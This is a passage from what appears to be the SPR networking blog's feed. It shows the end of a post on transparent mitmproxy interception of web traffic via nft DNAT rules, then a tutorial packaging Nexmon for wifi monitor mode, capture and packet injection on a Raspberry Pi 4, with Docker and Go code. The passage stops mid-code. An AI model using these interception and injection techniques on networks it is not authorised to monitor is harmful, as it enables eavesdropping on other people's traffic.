<h2 class="anchor anchorWithStickyNavbar_LWe7" id="leveraging-transparent-sockets">Leveraging Transparent Sockets<a href="https://www.supernetworks.org/pages/blog/spr-mitmproxy#leveraging-transparent-sockets" class="hash-link" aria-label="Direct link to Leveraging Transparent Sockets" title="Direct link to Leveraging Transparent Sockets">​</a></h2>
<p>Behind the scenes, <code>mitmproxy</code> is using transparent sockets with DNAT. Inside the container network,
we establish dnat rules to <code>mitmproxy</code> from incoming ports <code>80</code>, <code>443</code>.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nft -f - &lt;&lt; EOF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">table inet nat {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        chain prerouting {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                type nat hook prerouting priority filter; policy accept;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                tcp dport { 80, 443 } dnat ip to 127.0.0.1:9999</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">EOF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mitmweb -p 9999 -m transparent --web-host 0.0.0.0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="wed-love-to-hear-from-you">We'd love to hear from you<a href="https://www.supernetworks.org/pages/blog/spr-mitmproxy#wed-love-to-hear-from-you" class="hash-link" aria-label="Direct link to We'd love to hear from you" title="Direct link to We'd love to hear from you">​</a></h2>
<p>We're always thrilled to get feedback on plugins people would like to see, and we're
excited to hear about what people will be able to do with <code>mitmproxy</code> running
alongside SPR. Drop a line at <a href="mailto:outreach+s@supernetworks.org" target="_blank" rel="noopener noreferrer">outreach[at]supernetworks.org</a> or join us on <a href="https://discord.com/invite/EUjTKJPPAX" target="_blank" rel="noopener noreferrer">discord</a></p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="mitmproxy" term="mitmproxy"/>
        <category label="microsegmentation" term="microsegmentation"/>
        <category label="transparent sockets" term="transparent sockets"/>
        <category label="PLUS" term="PLUS"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Loading up nexmon on a RPI4 with SPR]]></title>
        <id>https://www.supernetworks.org/pages/blog/spr-nexmon</id>
        <link href="https://www.supernetworks.org/pages/blog/spr-nexmon"/>
        <updated>2023-11-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[The built-in wifi radio on a Raspberry Pi 4 is kind of sad, as it does not support monitor mode.]]></summary>
        <content type="html"><![CDATA[<p>The built-in wifi radio on a Raspberry Pi 4 is kind of sad, as it does not support monitor mode.
Luckily the hackers at Seemo Labs have fixed this.</p>
<p>In this post we'll describe how to load Seemoo's Nexmon onto a pi4 running a modern kernel, and package it into a SPR Plugin
named  <a href="https://github.com/spr-networks/spr-nexmon/tree/main" target="_blank" rel="noopener noreferrer">spr-nexmon</a>. We'll demonstrate that packet capture and injection works.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="first-we-will-copy-the-template-plugin">First, we will copy the template plugin<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#first-we-will-copy-the-template-plugin" class="hash-link" aria-label="Direct link to First, we will copy the template plugin" title="Direct link to First, we will copy the template plugin">​</a></h2>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token command shell-symbol important">$</span><span class="token command"> </span><span class="token command bash language-bash">cp -R super/api_sample_plugin/ spr-nexmon</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="development">Development<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#development" class="hash-link" aria-label="Direct link to Development" title="Direct link to Development">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prebuilt-binaries">Prebuilt binaries<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#prebuilt-binaries" class="hash-link" aria-label="Direct link to Prebuilt binaries" title="Direct link to Prebuilt binaries">​</a></h3>
<p>We'll use some prebuilt binaries that include</p>
<ul>
<li>the nexmon firmware build for the broadcom wifi radio</li>
<li>the 6.2 kernel build</li>
<li>the nexutil binary</li>
</ul>
<p>These were built from the <a href="https://github.com/seemoo-lab/nexmon/compare/master...DrSchottky:nexmon:rpi-6.1.y" target="_blank" rel="noopener noreferrer">6.1/6.2 support pull-request</a></p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token command shell-symbol important">$</span><span class="token command"> </span><span class="token command bash language-bash">cp -R ../nexmon/binaries spr-nexmon/binaries</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="docker-preparations">Docker preparations<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#docker-preparations" class="hash-link" aria-label="Direct link to Docker preparations" title="Direct link to Docker preparations">​</a></h3>
<p>We'll update the Dockerfile to include some useful tools and build the project.</p>
<div class="language-docker codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-docker codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token instruction"> ubuntu:23.04 </span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token instruction"> builder</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">ENV</span><span class="token instruction"> DEBIAN_FRONTEND=noninteractive</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">RUN</span><span class="token instruction"> apt-get update</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">RUN</span><span class="token instruction"> apt-get install -y --no-install-recommends nano ca-certificates git curl</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">RUN</span><span class="token instruction"> mkdir /code</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">WORKDIR</span><span class="token instruction"> /code</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">ARG</span><span class="token instruction"> TARGETARCH</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">RUN</span><span class="token instruction"> curl -O https://dl.google.com/go/go1.20.linux-</span><span class="token instruction variable" style="color:rgb(189, 147, 249);font-style:italic">${TARGETARCH}</span><span class="token instruction">.tar.gz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">RUN</span><span class="token instruction"> rm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.20.linux-</span><span class="token instruction variable" style="color:rgb(189, 147, 249);font-style:italic">${TARGETARCH}</span><span class="token instruction">.tar.gz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:rgb(255, 121, 198)">"/usr/local/go/bin:$PATH"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">COPY</span><span class="token instruction"> code/ /code/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">ARG</span><span class="token instruction"> USE_TMPFS=true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">RUN</span><span class="token instruction"> </span><span class="token instruction options property">--mount</span><span class="token instruction options punctuation" style="color:rgb(248, 248, 242)">=</span><span class="token instruction options string" style="color:rgb(255, 121, 198)">type=tmpfs,target=/tmpfs</span><span class="token instruction"> </span><span class="token instruction operator">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token instruction">    [ </span><span class="token instruction string" style="color:rgb(255, 121, 198)">"$USE_TMPFS"</span><span class="token instruction"> = </span><span class="token instruction string" style="color:rgb(255, 121, 198)">"true"</span><span class="token instruction"> ] &amp;&amp; ln -s /tmpfs /root/go; </span><span class="token instruction operator">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token instruction">    go build -ldflags </span><span class="token instruction string" style="color:rgb(255, 121, 198)">"-s -w"</span><span class="token instruction"> -o /nexmon_plugin /code/nexmon_plugin.go</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token instruction"> ghcr.io/spr-networks/container_template:latest</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">ENV</span><span class="token instruction"> DEBIAN_FRONTEND=noninteractive</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">RUN</span><span class="token instruction"> apt-get update &amp;&amp; apt-get install -y --no-install-recommends tcpdump kmod iw wireless-regdb &amp;&amp; rm -rf /var/lib/apt/lists/*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">COPY</span><span class="token instruction"> scripts /scripts/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">COPY</span><span class="token instruction"> </span><span class="token instruction options property">--from</span><span class="token instruction options punctuation" style="color:rgb(248, 248, 242)">=</span><span class="token instruction options string" style="color:rgb(255, 121, 198)">builder</span><span class="token instruction"> /nexmon_plugin /</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">COPY</span><span class="token instruction"> binaries/ nexmon/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token instruction keyword" style="color:rgb(189, 147, 249);font-style:italic">ENTRYPOINT</span><span class="token instruction"> [</span><span class="token instruction string" style="color:rgb(255, 121, 198)">"/scripts/startup.sh"</span><span class="token instruction">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We also want this container to use the host network and be privileged so it
can load kernel modules. And we'll also set it to restart automatically</p>
<p>And heres the docker-compose.yml:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token key atrule">version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'3.4'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">x-logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token important">&amp;default-logging</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">driver</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> journald</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">x-labels</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token important">&amp;default-labels</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">org.supernetworks.ci</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> $</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain">CI</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token boolean important">false</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">org.supernetworks.version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> $</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain">RELEASE_VERSION</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain">latest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain">$</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain">RELEASE_CHANNEL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">services</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">nexmon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token key atrule">container_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> supernexmon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token key atrule">build</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token key atrule">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token key atrule">labels</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token important">*default-labels</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token key atrule">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token important">*default-logging</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token key atrule">restart</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> always</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token key atrule">network_mode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token key atrule">privileged</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token boolean important">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token key atrule">volumes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> /etc/timezone</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">/etc/timezone</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">ro</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> /etc/localtime</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">/etc/localtime</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">ro</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> /lib/firmware/cypress/</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">/lib/firmware/cypress/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"${SUPERDIR}./state/plugins/nexmon:/state/plugins/nexmon"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"${SUPERDIR}./state/public/:/state/public/:ro"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="extending-the-spr-api">Extending the SPR API<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#extending-the-spr-api" class="hash-link" aria-label="Direct link to Extending the SPR API" title="Direct link to Extending the SPR API">​</a></h3>
<p>The Nexmon patch breaks the ability to change channels normally. Instead, we can do it
with the 'nexutil' binary that nexmon provides.</p>
<p>We'll rename <code>sample_plugin.go</code> to <code>nexmon_plugin.go</code> and define a new function</p>
<div class="language-go codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-go codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">func</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">changeChannel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">w http</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ResponseWriter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> r </span><span class="token operator">*</span><span class="token plain">http</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	channel </span><span class="token operator">:=</span><span class="token plain"> r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">URL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">Query</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">Get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"channel"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// Use regexp.MatchString to check if the input matches the pattern</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	matches</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> err </span><span class="token operator">:=</span><span class="token plain"> regexp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">MatchString</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"^[0-9/]*$"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> err </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token boolean">nil</span><span class="token plain"> </span><span class="token operator">||</span><span class="token plain"> </span><span class="token operator">!</span><span class="token plain">matches </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		http</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">Error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">w</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Invalid channel string"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">400</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	err </span><span class="token operator">=</span><span class="token plain"> exec</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">Command</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"/nexmon/nexutil"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"-k"</span><span class="token operator">+</span><span class="token plain">channel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">Run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> err </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token boolean">nil</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		http</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">Error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">w</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> err</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">Error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">400</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 